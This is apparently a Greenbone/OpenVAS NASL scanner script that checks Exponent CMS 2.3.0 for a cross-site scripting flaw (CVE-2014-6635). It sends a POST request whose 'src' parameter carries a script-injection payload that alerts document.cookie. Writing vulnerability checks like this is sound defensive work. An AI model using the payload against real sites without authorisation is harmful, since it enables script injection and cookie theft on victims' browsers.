# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:exponentcms:exponent_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804785");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2014-6635");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2014-10-31 13:10:53 +0530 (Fri, 31 Oct 2014)");
  script_name("Exponent CMS 'src' POST Parameter Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_exponet_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ExponentCMS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/96158");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/128335");

  script_tag(name:"summary", value:"Exponent CMS is prone to an XSS vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper sanitization of
  user supplied input passed via 'src' parameter in the search action to index.php");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Exponent CMS version 2.3.0, Prior versions
  may also be affected.");

  script_tag(name:"solution", value:"Upgrade to Exponent CMS version after 2.3.0");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.exponentcms.org");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/index.php" ;

postData = 'int=&src="/><script>alert(document.cookie)</script>' +
           '<"&controller=search&search=&action=none' ;

host = http_host_name( port:port );

sndReq = string( "POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData, "\r\n" );
rcvRes = http_keepalive_send_recv( port:port, data:sndReq, bodyonly:FALSE );

if( rcvRes =~ "^HTTP/1\.[01] 200" && '><script>alert(document.cookie)</script>' >< rcvRes ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
